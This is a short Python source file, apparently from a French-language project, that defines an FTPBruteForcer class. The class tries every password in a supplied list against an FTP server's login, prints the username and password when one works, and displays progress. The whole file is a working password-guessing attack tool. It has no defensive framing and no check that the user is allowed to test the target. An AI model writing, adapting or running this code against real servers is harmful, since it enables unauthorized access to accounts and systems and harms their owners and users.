from ftplib import FTP
from affichageprogression import display_progress

class FTPBruteForcer:
    def __init__(self, host, port, username, password_list):
        self.host = host
        self.port = port
        self.username = username
        self.password_list = password_list

    def attempt_login(self, password):
        try:
            ftp = FTP()
            ftp.connect(self.host, self.port)
            ftp.login(self.username, password)
            ftp.quit()
            print("Connexion reussi ! ")
            print("Nom d'utilisateur : ", self.username)
            print("Mot de passe : ", password)
            return True
        except Exception as e:
            return False

    def brute_force(self):
        total_attempts = len(self.password_list)
        for attempt, password in enumerate(self.password_list, start=1):
            if self.attempt_login(password):
                break
            display_progress(total_attempts, attempt)
